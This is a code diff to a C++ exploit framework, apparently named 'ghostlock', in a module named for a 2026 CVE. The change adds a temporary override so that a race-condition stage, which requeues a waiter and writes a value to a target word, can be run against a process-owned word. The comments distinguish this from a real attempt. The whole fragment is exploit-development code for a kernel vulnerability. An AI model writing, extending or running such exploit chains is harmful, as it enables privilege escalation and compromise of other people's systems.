@@ -115,10 +115,14 @@ namespace ghostlock::backend::cve_2026_43499::steps {
                    /* The word the waiter parks on. Different from the target in any real attempt,
                     *  because the kernel refuses to requeue a word onto itself; null keeps the target as
                     *  before, which is what the tests that predate the distinction expect. */
-                   std::uint32_t *chain_word = nullptr) noexcept
+                   std::uint32_t *chain_word = nullptr,
+                   /* TEMPORARY: overrides the word the attempt locks, so a run can exercise the
+                    *  whole chain against a word this process owns. Null keeps the request target,
+                    *  which is what a real attempt aims at. */
+                   std::uint32_t *target_word_override = nullptr) noexcept
             : race_(race), window_(window), offsets_(offsets), targets_(targets), fragment_(fragment),
               fragment_size_(fragment_size), pointer_bytes_(pointer_bytes), value_(value),
-              chain_word_(chain_word) {}
+              chain_word_(chain_word), target_word_override_(target_word_override) {}
 
         [[nodiscard]] Stage last_stage() const noexcept { return stage_; }
         [[nodiscard]] memory::RequestVerdict last_request() const noexcept { return request_verdict_; }
@@ -141,7 +145,9 @@ namespace ghostlock::backend::cve_2026_43499::steps {
                 return false;
             }
             stage_ = Stage::Race;
-            auto *const target_word = reinterpret_cast<std::uint32_t *>(request.target);
+            auto *const requested_word = reinterpret_cast<std::uint32_t *>(request.target);
+            auto *const target_word =
+                target_word_override_ != nullptr ? target_word_override_ : requested_word;
             race_.prepare(chain_word_ != nullptr ? chain_word_ : target_word, target_word);
             race_outcome_ = race_.run(window_);
             /* The route shape is prepare, execute, disarm, destroy, and the verdict is true
@@ -169,6 +175,7 @@ namespace ghostlock::backend::cve_2026_43499::steps {
         std::size_t fragment_size_ = 0U;
         std::size_t pointer_bytes_ = 0U;
         std::uint32_t *chain_word_ = nullptr;
+        std::uint32_t *target_word_override_ = nullptr;
         std::uint64_t value_ = 0U;
         Stage stage_ = Stage::NotRun;
         memory::RequestVerdict request_verdict_ = memory::RequestVerdict::Ok;
